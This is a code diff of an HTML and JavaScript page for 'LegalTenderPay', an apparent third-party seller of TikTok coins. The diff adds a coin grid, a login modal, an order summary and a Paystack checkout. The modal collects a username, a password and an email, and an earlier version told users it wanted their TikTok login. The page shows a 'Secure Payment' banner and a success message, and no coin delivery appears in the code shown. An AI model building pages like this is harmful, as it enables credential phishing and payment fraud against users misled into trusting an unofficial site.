@@ -16,8 +16,6 @@ body {
   padding: 0;
   color: #000;
 }
-
-/* Top secure banner */
 .secure-payment {
   background-color: #e8f8ed;
   text-align: center;
@@ -26,15 +24,11 @@ body {
   color: #006b3f;
   font-weight: 600;
 }
-
-/* Container for everything */
 .container {
   max-width: 420px;
   margin: 0 auto;
   padding: 15px 20px 20px 20px;
 }
-
-/* Header with logo */
 .header {
   display: flex;
   justify-content: space-between;
@@ -42,7 +36,6 @@ body {
   margin-top: 15px;
   margin-bottom: 10px;
 }
-
 .header h1 {
   margin: 0;
   font-size: 32px;
@@ -50,8 +43,6 @@ body {
   margin-top: 15px;
   line-height: 1.2;
 }
-
-/* Sub-text */
 .sub-text {
   font-size: 15px;
   color: #333;
@@ -60,13 +51,10 @@ body {
   margin-bottom: 10px;
   line-height: 1.4;
 }
-
 .sub-text span {
   color: #ff355e;
   font-weight: 700;
 }
-
-/* Logo box */
 .logo-box {
   width: 120px;
   height: 120px;
@@ -77,15 +65,12 @@ body {
   justify-content: center;
   margin-top: 10px;
 }
-
 .logo-box img {
   width: 100%;
   height: 100%;
   object-fit: contain;
   border-radius: 12px;
 }
-
-/* Coin boxes grid */
 .coins-grid {
   display: grid;
   grid-template-columns: repeat(3, 1fr);
@@ -93,7 +78,6 @@ body {
   margin-top: 20px;
   margin-bottom: 25px;
 }
-
 .coin-box {
   background-color: #f8f8f8;
   border-radius: 10px;
@@ -103,12 +87,10 @@ body {
   transition: 0.3s;
   border: 1px solid #f0f0f0;
 }
-
 .coin-box.active {
   border: 2px solid #ffadc4;
   background-color: #fff6f9;
 }
-
 .coin-amount {
   font-weight: 700;
   font-size: 18px;
@@ -117,24 +99,19 @@ body {
   justify-content: center;
   gap: 5px;
 }
-
 .coin-amount img {
   width: 20px;
   height: 20px;
 }
-
 .coin-price {
   color: #666;
   font-size: 14px;
   margin-top: 3px;
 }
-
-/* Custom input */
 .custom-input {
   display: none;
   text-align: center;
 }
-
 .custom-input input {
   width: 70%;
   padding: 10px;
@@ -143,8 +120,6 @@ body {
   border-radius: 8px;
   margin-top: 10px;
 }
-
-/* Main login/buy button */
 .login-btn {
   background-color: #ff375f;
   color: white;
@@ -157,8 +132,6 @@ body {
   cursor: pointer;
   margin-bottom: 25px;
 }
-
-/* Invite section */
 .invite-box {
   background-color: #fff;
   border-radius: 10px;
@@ -169,55 +142,40 @@ body {
   justify-content: space-between;
   margin-bottom: 15px;
 }
-
 .invite-left {
   display: flex;
   align-items: center;
 }
-
 .invite-left img {
   width: 35px;
   margin-right: 10px;
 }
-
 .invite-text {
   font-size: 16px;
   font-weight: 600;
 }
-
 .invite-sub {
   color: #666;
   font-size: 13px;
 }
-
 .share-btn {
   font-size: 22px;
   color: #999;
   cursor: pointer;
-  transition: 0.2s;
 }
-
-/* Coin image section */
 .coin-image-section {
   text-align: center;
   margin-top: 25px;
 }
-
 .coin-image-section img {
   width: 240px;
-  height: auto;
   border-radius: 12px;
-  transition: 0.3s ease;
 }
-
-/* Footer */
 .footer {
   text-align: center;
   margin-top: 100px;
   opacity: 0.6;
 }
-
-/* Loading & Login overlay */
 .loading-overlay, .login-modal {
   display: none;
   position: fixed;
@@ -230,14 +188,11 @@ body {
   justify-content: center;
   align-items: center;
 }
-
-/* Loader animation */
 .loader {
   width: 80px;
   height: 80px;
   position: relative;
 }
-
 .loader::before, .loader::after {
   content: '';
   position: absolute;
@@ -247,26 +202,13 @@ body {
   border-radius: 50%;
   animation: tikSpin 0.8s infinite;
 }
-
-.loader::before {
-  left: 0;
-  background: #25f4ee;
-}
-
-.loader::after {
-  right: 0;
-  background: #ff375f;
-  animation-delay: 0.4s;
-}
-
+.loader::before { left: 0; background: #25f4ee; }
+.loader::after { right: 0; background: #ff375f; animation-delay: 0.4s; }
 @keyframes tikSpin {
-  0%, 100% { transform: scale(1); opacity: 0.9; }
-  50% { transform: scale(1.3); opacity: 0.5; }
+  0%,100%{transform:scale(1);opacity:0.9;}
+  50%{transform:scale(1.3);opacity:0.5;}
 }
-
-/* Login modal */
 .login-content {
-  position: relative;
   background: #fff;
   border-radius: 14px;
   padding: 25px 20px;
@@ -274,20 +216,8 @@ body {
   text-align: center;
   width: 90%;
   max-width: 380px;
+  position: relative;
 }
-
-.login-content h2 {
-  color: #000;
-  font-size: 22px;
-  margin-bottom: 8px;
-}
-
-.login-content p {
-  color: #666;
-  font-size: 14px;
-  margin-bottom: 20px;
-}
-
 .login-content input {
   width: 85%;
   padding: 12px;
@@ -296,7 +226,6 @@ body {
   border-radius: 6px;
   font-size: 15px;
 }
-
 .login-content button {
   background: #ff375f;
   color: #fff;
@@ -309,6 +238,49 @@ body {
   font-size: 16px;
   opacity: 0.6;
 }
+.order-summary {
+  display: none;
+  position: fixed;
+  z-index: 1400;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  height: 55%;
+  background: #fff;
+  border-top-left-radius: 18px;
+  border-top-right-radius: 18px;
+  box-shadow: 0 -6px 24px rgba(0,0,0,0.16);
+  padding: 18px;
+  overflow: auto;
+  animation: slideUp 0.28s ease;
+}
+@keyframes slideUp { from{transform:translateY(100%);} to{transform:translateY(0);} }
+.pay-now {
+  margin-top: 16px;
+  width: 100%;
+  background-color: #ff375f;
+  color: white;
+  padding: 14px;
+  border: none;
+  border-radius: 10px;
+  font-size: 17px;
+  font-weight: 700;
+  cursor: pointer;
+}
+.toast {
+  display:none;
+  position: fixed;
+  z-index: 1600;
+  left: 50%;
+  transform: translateX(-50%);
+  top: 24px;
+  background: #e6ffef;
+  color: #006b3f;
+  padding: 12px 18px;
+  border-radius: 8px;
+  font-weight: 700;
+}
+.order-close { position: absolute; right: 14px; top: 10px; font-size: 20px; cursor: pointer; color: #999; }
 </style>
 </head>
 
@@ -316,34 +288,152 @@ body {
 <div class="secure-payment">Secure Payment via LegalTenderPay</div>
 
 <div class="container">
-  <!-- ... existing structure (Get Coins, Grid, etc.) ... -->
+  <div class="header">
+    <div>
+      <h1>Get Coins</h1>
+      <p class="sub-text">Save around <span>25%</span> with a lower third-party service fee.</p>
+    </div>
+    <div class="logo-box">
+      <img src="https://raw.githubusercontent.com/LegalTenderPay/LegalTenderPaySite/refs/heads/main/IMG_0855.jpeg">
+    </div>
+  </div>
+
+  <div class="coins-grid" id="coinsGrid"></div>
+
+  <div class="custom-input" id="customInputBox">
+    <input type="number" id="customAmount" placeholder="Enter coins amount" oninput="updateCustomAmount()">
+  </div>
+
+  <button class="login-btn" id="mainButton" onclick="mainButtonAction()">Log in to get Coins</button>
+
+  <div class="invite-box">
+    <div class="invite-left">
+      <img src="https://cdn-icons-png.flaticon.com/512/12749/12749038.png">
+      <div><div class="invite-text">Invite & Get Rewards</div><div class="invite-sub">Check out this new feature!</div></div>
+    </div>
+    <span class="share-btn" onclick="alert('Share this link manually!')">&#62;</span>
+  </div>
+
+  <div class="coin-image-section">
+    <img src="https://raw.githubusercontent.com/LegalTenderPay/LegalTenderPaySite/refs/heads/main/70a854a7-f718-447f-9176-6ea7a74ff63e.jpeg">
+  </div>
+
+  <div class="footer">LegalTenderPay</div>
 </div>
 
-<!-- Loading animation -->
-<div class="loading-overlay" id="loadingOverlay">
-  <div class="loader"></div>
-</div>
+<div class="loading-overlay" id="loadingOverlay"><div class="loader"></div></div>
 
-<!-- Login modal (with Email added) -->
 <div class="login-modal" id="loginModal">
   <div class="login-content">
-    <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg"
-         alt="TikTok Logo"
-         style="width: 80px; position: absolute; top: 20px; right: 25px; opacity: 0.9;">
-    <h2 style="margin-top: 20px;">Log in to get Coins</h2>
-    <p>Log in to your TikTok account to confirm where to send coins.</p>
-
+    <h2>Log in to get Coins</h2>
     <input type="text" id="usernameInput" placeholder="Username" required><br>
     <input type="password" id="passwordInput" placeholder="Password" required><br>
-    <input type="email" id="emailInput" placeholder="Email (optional)" style="margin-top:8px;"><br>
-
+    <input type="email" id="emailInput" placeholder="Email" required><br>
     <button id="continueBtn" disabled onclick="completeLogin()">Continue</button>
   </div>
 </div>
 
-<!-- You can keep the rest of your Paystack and JS scripts as before -->
+<div class="order-summary" id="orderSummary">
+  <div class="order-close" onclick="closeOrderSummary()">✕</div>
+  <h2>Order Summary</h2>
+  <div class="summary-row"><div class="summary-label">Account</div><div id="accountUsername">@user</div></div>
+  <div class="summary-row"><div class="summary-label">Email</div><div id="accountEmail">user@example.com</div></div>
+  <div class="summary-row"><div class="summary-label">Coins</div><div id="summaryCoins">0 Coins</div></div>
+  <div class="summary-row"><div class="summary-label">Amount</div><div id="summaryAmount">₦0</div></div>
+  <button class="pay-now" id="payNowBtn" onclick="payWithPaystack()">Pay Now</button>
+</div>
+
+<div class="toast" id="successToast">Payment Successful — Coins will be sent shortly.</div>
+
 <script>
-// existing JS code untouched...
+const PAYSTACK_PUBLIC_KEY = 'pk_live_05d5fe8301b202427f3d3a9b26059269ddd1c00f';
+const MERCHANT_EMAIL = 'Legaltenderpay@gmail.com';
+let coinRate = 17.71;
+let selectedCoins = 0;
+let loggedIn = false;
+
+const coinOptions = [
+  {amount:30,price:530},{amount:350,price:6200},
+  {amount:700,price:12400},{amount:1400,price:24700},
+  {amount:3500,price:61985},{amount:'custom',price:0}
+];
+const grid = document.getElementById('coinsGrid');
+coinOptions.forEach(opt=>{
+  const div=document.createElement('div');
+  div.className='coin-box';
+  div.setAttribute('data-coins',opt.amount);
+  div.innerHTML=opt.amount==='custom'
+   ? `<span class="coin-amount">Custom</span>`
+   : `<div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">${opt.amount}</div><div class="coin-price">₦${opt.price.toLocaleString()}</div>`;
+  div.onclick=()=>selectBox(div);
+  grid.appendChild(div);
+});
+
+function formatCurrency(a){return '₦'+Math.round(a).toLocaleString('en-NG');}
+function selectBox(el){
+  document.querySelectorAll('.coin-box').forEach(b=>b.classList.remove('active'));
+  el.classList.add('active');
+  const data=el.getAttribute('data-coins');
+  if(data==='custom'){document.getElementById('customInputBox').style.display='block';selectedCoins=0;}
+  else{selectedCoins=parseInt(data)||0;document.getElementById('customInputBox').style.display='none';}
+  updateMainButton();
+}
+function updateCustomAmount(){
+  const v=parseInt(document.getElementById('customAmount').value);
+  selectedCoins=v>0?v:0;updateMainButton();
+}
+function updateMainButton(){
+  const btn=document.getElementById('mainButton');
+  if(!loggedIn){btn.textContent='Log in to get Coins';return;}
+  if(selectedCoins>0){btn.textContent=`Buy ${selectedCoins} Coins for ${formatCurrency(selectedCoins*coinRate)}`;}
+  else{btn.textContent='Buy Now';}
+}
+function mainButtonAction(){if(!loggedIn){startLogin();}else{showOrderSummary();}}
+function startLogin(){
+  document.getElementById('loadingOverlay').style.display='flex';
+  setTimeout(()=>{
+    document.getElementById('loadingOverlay').style.display='none';
+    document.getElementById('loginModal').style.display='flex';
+  },700);
+}
+function completeLogin(){
+  document.getElementById('loginModal').style.display='none';
+  loggedIn=true;
+  updateMainButton();
+}
+function showOrderSummary(){
+  const u=document.getElementById('usernameInput').value||'User';
+  const e=document.getElementById('emailInput').value||'example@gmail.com';
+  document.getElementById('accountUsername').textContent='@'+u;
+  document.getElementById('accountEmail').textContent=e;
+  document.getElementById('summaryCoins').textContent=selectedCoins+' Coins';
+  document.getElementById('summaryAmount').textContent=formatCurrency(selectedCoins*coinRate);
+  document.getElementById('orderSummary').style.display='block';
+}
+function closeOrderSummary(){document.getElementById('orderSummary').style.display='none';}
+function payWithPaystack(){
+  const u=document.getElementById('usernameInput').value||'User';
+  const e=document.getElementById('emailInput').value||'example@gmail.com';
+  const amountKobo=Math.round(selectedCoins*coinRate*100);
+  const handler=PaystackPop.setup({
+    key:PAYSTACK_PUBLIC_KEY,email:e,amount:amountKobo,currency:'NGN',
+    metadata:{custom_fields:[
+      {display_name:'TikTok username',variable_name:'username',value:'@'+u},
+      {display_name:'Email',variable_name:'email',value:e},
+      {display_name:'Coins',variable_name:'coins',value:selectedCoins.toString()}
+    ]},
+    callback:function(){
+      document.getElementById('orderSummary').style.display='none';
+      showSuccessToast();
+    }
+  });
+  handler.openIframe();
+}
+function showSuccessToast(){
+  const t=document.getElementById('successToast');
+  t.style.display='block';setTimeout(()=>t.style.opacity='1',10);
+  setTimeout(()=>{t.style.opacity='0';setTimeout(()=>t.style.display='none',300);},4000);
+}
 </script>
 </body>
 </html>
